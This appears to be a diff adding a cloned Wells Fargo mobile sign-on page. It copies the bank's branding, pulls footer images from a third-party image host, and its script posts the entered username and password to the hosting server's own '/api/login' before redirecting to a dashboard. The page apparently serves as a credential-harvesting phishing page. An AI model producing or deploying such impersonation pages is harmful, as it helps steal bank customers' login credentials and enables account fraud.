@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Wells Fargo - Sign On</title>
+    <style>
+        /* --- CSS Reset & Colors --- */
+        :root {
+            --wf-red: #d71e28;
+            --wf-gold: #fec33c;
+            --wf-blue: #005b8f;
+            --wf-black: #1f1f1f;
+            --wf-white: #ffffff;
+            --wf-gray-text: #444444;
+            --wf-gray-border: #767676;
+            --wf-gray-input-border: #8d8d8d;
+            --wf-btn-disabled: #e4e4e4;
+            --wf-btn-disabled-text: #b6b6b6;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: var(--wf-white);
+            color: var(--wf-black);
+            -webkit-font-smoothing: antialiased;
+            padding-bottom: 0; 
+        }
+
+        /* --- Header Section --- */
+        .header {
+            background-color: var(--wf-red);
+            height: 60px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 16px;
+            border-bottom: 7px solid var(--wf-gold);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            color: var(--wf-white);
+            font-family: 'Times New Roman', Times, serif;
+            font-size: 1.3rem;
+            font-weight: bold;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 18px;
+            width: 26px;
+        }
+
+        .menu-bar { width: 100%; height: 2px; background-color: var(--wf-white); border-radius: 2px; }
+
+        /* --- Main Content --- */
+        .main-content {
+            padding: 2.5rem 1.5rem 1rem 1.5rem; 
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .page-title {
+            font-size: 2.2rem;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 2rem;
+            color: var(--wf-black);
+            font-family: 'Georgia', 'Times New Roman', Times, serif;
+        }
+
+        /* --- Form Elements --- */
+        .form-group { margin-bottom: 1rem; position: relative; }
+
+        .form-input {
+            width: 100%;
+            height: 54px;
+            padding: 0 1rem;
+            font-size: 1.15rem;
+            border: 1px solid var(--wf-gray-input-border);
+            border-radius: 12px;
+            color: var(--wf-black);
+            outline: none;
+            appearance: none;
+            background-color: transparent;
+        }
+
+        .form-input::placeholder { color: #555; font-size: 1.15rem; }
+        .form-input:focus { border-color: var(--wf-black); border-width: 1px; }
+
+        .toggle-password {
+            position: absolute; right: 16px; top: 50%; transform: translateY(-50%);
+            color: #003057; font-weight: bold; font-size: 1rem;
+            text-decoration: underline; background: none; border: none; cursor: pointer; padding: 0;
+        }
+
+        /* Checkbox */
+        .checkbox-container { display: flex; align-items: flex-start; margin-top: 1.5rem; margin-bottom: 0.5rem; }
+        .checkbox-input {
+            width: 24px; height: 24px; min-width: 24px; margin-right: 12px;
+            border: 1px solid var(--wf-gray-border); border-radius: 4px;
+            appearance: none; -webkit-appearance: none; cursor: pointer; position: relative;
+        }
+        .checkbox-input:checked { background-color: var(--wf-blue); border-color: var(--wf-blue); }
+        .checkbox-input:checked::after {
+            content: ''; position: absolute; left: 7px; top: 2px; width: 6px; height: 12px;
+            border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg);
+        }
+        .checkbox-label { font-size: 1.1rem; color: #333; margin-top: 2px; }
+
+        .helper-text { font-size: 0.95rem; color: #595959; line-height: 1.4; margin-bottom: 2.5rem; margin-top: 8px; }
+
+        /* --- Buttons --- */
+        .btn {
+            display: block; width: 100%; padding: 14px; border-radius: 30px;
+            font-size: 1.1rem; font-weight: bold; text-align: center;
+            cursor: pointer; border: none; font-family: inherit;
+        }
+
+        .sign-on-btn {
+            background-color: var(--wf-btn-disabled);
+            color: var(--wf-btn-disabled-text);
+            margin-bottom: 1rem;
+            cursor: default;
+        }
+        
+        .sign-on-btn.active {
+            background-color: #003087;
+            color: white;
+            cursor: pointer;
+        }
+
+        .separator { text-align: center; margin: 0.5rem 0 1rem 0; color: var(--wf-black); font-size: 1rem; }
+
+        .passkey-btn {
+            background-color: var(--wf-white);
+            color: var(--wf-black);
+            border: 1px solid var(--wf-black);
+            display: flex; justify-content: center; align-items: center; gap: 8px;
+        }
+
+        /* --- Footer Links --- */
+        .bottom-text { font-size: 1rem; color: var(--wf-black); line-height: 1.4; margin: 2rem 0; text-align: left; }
+
+        .forgot-link {
+            display: flex; align-items: center; color: var(--wf-blue);
+            text-decoration: none; font-size: 1.1rem; font-weight: normal; margin-bottom: 0.75rem;
+        }
+        .forgot-link:hover { text-decoration: underline; }
+        .arrow-icon { margin-right: 8px; font-size: 1.2rem; line-height: 1; }
+
+        .footer-image-container { width: 100%; margin-top: 2rem; display: flex; flex-direction: column; }
+        .footer-img { width: 100%; height: auto; display: block; vertical-align: middle; }
+
+        /* Error Message */
+        .error-banner {
+            background-color: #fdecece0; border: 1px solid #d71e28; color: #d71e28;
+            padding: 10px; border-radius: 8px; margin-bottom: 20px; text-align: center; display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="index.html" class="logo">WELLS FARGO</a>
+        <button class="menu-btn" aria-label="Menu">
+            <span class="menu-bar"></span><span class="menu-bar"></span><span class="menu-bar"></span>
+        </button>
+    </header>
+
+    <main class="main-content">
+        <h1 class="page-title">Good morning</h1>
+
+        <div id="errorBanner" class="error-banner"></div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="username" class="form-input" placeholder="Username">
+            </div>
+
+            <div class="form-group">
+                <input type="password" id="password" class="form-input" placeholder="Password">
+                <button type="button" class="toggle-password" id="togglePassword">Show</button>
+            </div>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="saveUsername" class="checkbox-input">
+                <label for="saveUsername" class="checkbox-label">Save username</label>
+            </div>
+
+            <p class="helper-text">To help keep your account secure, save your username only on devices that aren't used by other people.</p>
+
+            <button type="submit" class="btn sign-on-btn" id="signOnBtn" disabled>Sign on</button>
+
+            <div class="separator">or</div>
+
+            <button type="button" class="btn passkey-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                </svg>
+                Use a passkey
+            </button>
+        </form>
+
+        <p class="bottom-text">Don't have one? Create a passkey after signing on and skip the password next time.</p>
+
+        <a href="#" class="forgot-link">
+            <span class="arrow-icon">&rarr;</span> Forgot username or password?
+        </a>
+
+        <a href="register.html" class="forgot-link">
+            <span class="arrow-icon">&rarr;</span> Don’t have an account? Sign up
+        </a>
+    </main>
+
+    <div class="footer-image-container">
+        <img src="https://i.ibb.co/sY4BWQB/IMG-4135.jpg" alt="Footer Info 1" class="footer-img">
+        <img src="https://i.ibb.co/bjHWT6nt/IMG-4136.jpg" alt="Footer Info 2" class="footer-img">
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const loginForm = document.getElementById('loginForm');
+            const passwordInput = document.getElementById('password');
+            const toggleBtn = document.getElementById('togglePassword');
+            const usernameInput = document.getElementById('username');
+            const signOnBtn = document.getElementById('signOnBtn');
+            const errorBanner = document.getElementById('errorBanner');
+
+            // Password Show/Hide
+            toggleBtn.addEventListener('click', () => {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                toggleBtn.textContent = type === 'password' ? 'Show' : 'Hide';
+            });
+
+            // Enable/Disable Button
+            function updateButtonState() {
+                if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
+                    signOnBtn.classList.add('active');
+                    signOnBtn.removeAttribute('disabled');
+                } else {
+                    signOnBtn.classList.remove('active');
+                    signOnBtn.setAttribute('disabled', 'true');
+                }
+            }
+
+            usernameInput.addEventListener('input', updateButtonState);
+            passwordInput.addEventListener('input', updateButtonState);
+
+            // Handle Submit
+            loginForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                errorBanner.style.display = 'none';
+                signOnBtn.textContent = 'Signing On...';
+                signOnBtn.setAttribute('disabled', 'true');
+
+                const credentials = {
+                    username: usernameInput.value,
+                    password: passwordInput.value
+                };
+
+                try {
+                    const response = await fetch('/api/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(credentials)
+                    });
+
+                    const result = await response.json();
+
+                    if (response.ok) {
+                        // Store user ID if needed for session
+                        sessionStorage.setItem('userId', result.userId);
+                        // Redirect to dashboard
+                        window.location.href = 'user-dashboard.html';
+                    } else {
+                        throw new Error(result.message || 'Invalid credentials');
+                    }
+                } catch (err) {
+                    errorBanner.textContent = err.message;
+                    errorBanner.style.display = 'block';
+                    signOnBtn.textContent = 'Sign on';
+                    updateButtonState(); // Re-enable if inputs are still valid
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
